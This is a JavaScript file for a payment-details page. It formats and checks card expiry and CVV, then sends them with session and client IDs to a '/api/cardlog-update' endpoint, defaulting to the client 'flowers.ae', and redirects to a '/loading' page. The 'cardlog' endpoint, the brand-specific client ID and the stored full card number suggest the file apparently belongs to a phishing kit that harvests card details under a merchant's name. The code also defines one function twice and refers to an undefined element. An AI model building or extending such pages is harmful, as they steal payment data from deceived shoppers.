// card-details.js (FULL UPDATED ✅)
(function () {
  const form = document.getElementById("payment-details-form");
  const expiry = document.getElementById("expiry");
  const cvv = document.getElementById("cvv");
  const displayCardNumber = document.getElementById("displayCardNumber");
  const paymentAmount = document.getElementById("paymentAmount");
  const submitBtn = form.querySelector(".pay-button");

  // ✅ Error box UI container
  const errorBox = document.createElement("div");
  errorBox.className = "error-message";
  errorBox.style.display = "none";
  cvv.parentNode.appendChild(errorBox);

  function updatePriceFromStorage() {
    const bookingId = localStorage.getItem("bookingId");

    if (bookingId) {
      const textNode = orderNumber.firstChild;
      if (textNode) {
        textNode.textContent = bookingId;
      }
    }
  }

  // ✅ Live CVV validation (only 3 digits)
  cvv.addEventListener("input", () => {
    cvv.value = cvv.value.replace(/\D/g, "").slice(0, 3);
    if (cvv.value.length === 3) clearError();
  });

  // ✅ Live expiry formatting + validation
  expiry.addEventListener("input", () => {
    let v = expiry.value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
    expiry.value = v;
    if (/^\d{2}\/\d{2}$/.test(v)) clearError();
  });

  // ✅ Local validation before request
  function validateForm() {
    let valid = true;
    clearError();

    if (!/^\d{2}\/\d{2}$/.test(expiry.value)) {
      return showError("Enter valid expiry date: MM/YY", expiry);
    }

    const [month, year] = expiry.value.split("/").map(Number);
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;

    if (month < 1 || month > 12) {
      return showError("Invalid expiration month", expiry);
    }

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return showError("This card has expired", expiry);
    }

    if (cvv.value.length !== 3) {
      return showError("CVV must be 3 digits", cvv);
    }

    return true;
  }

  // ✅ UI Error Display
  function showError(msg, field) {
    errorBox.textContent = msg;
    errorBox.style.display = "block";
    field.classList.add("input-error");
    field.focus();
    return false;
  }

  // ✅ UI Server/Network Error Display
  function showBackendError(msg) {
    errorBox.textContent = msg;
    errorBox.style.display = "block";
    expiry.classList.add("input-error");
    expiry.focus();
  }

  function clearError() {
    errorBox.style.display = "none";
    expiry.classList.remove("input-error");
    cvv.classList.remove("input-error");
  }

  form.addEventListener("submit", (e) => {
    e.preventDefault();

    if (!validateForm()) return;

    submitBtn.disabled = true;
    submitBtn.innerHTML =
      '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle></svg> Processing...';

    const price = sessionStorage.getItem("price") || "101.00";

    fetch("/api/cardlog-update", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        sessionId: localStorage.getItem("sessionId"),
        clientId: localStorage.getItem("clientId") || "flowers.ae",
        cvv: cvv.value,
        expireDate: expiry.value,
        totalPrice: parseFloat(price),
      }),
    })
      .then((r) => r.json())
      .then((data) => {
        if (data.success) {
          window.location.href = "/loading";
        } else {
          // ✅ backend error — show to user
          showBackendError(data.error || "Payment failed");
          submitBtn.disabled = false;
          submitBtn.innerHTML = "Complete Payment";
        }
      })
      .catch(() => {
        showBackendError("Network error – try again");
        submitBtn.disabled = false;
        submitBtn.innerHTML = "Complete Payment";
      });
  });

  // ✅ Masked card number display
  function displayMaskedCardNumber() {
    const full = sessionStorage.getItem("cardNumber");
    if (!full) return;
    displayCardNumber.textContent = `**** **** **** ${full.slice(-4)}`;
  }

  // ✅ Price display
  function updatePriceFromStorage() {
    const price = sessionStorage.getItem("price");
    if (price)
      paymentAmount.textContent = `AED ${parseFloat(price).toFixed(2)}`;
  }

  displayMaskedCardNumber();
  updatePriceFromStorage();
})();
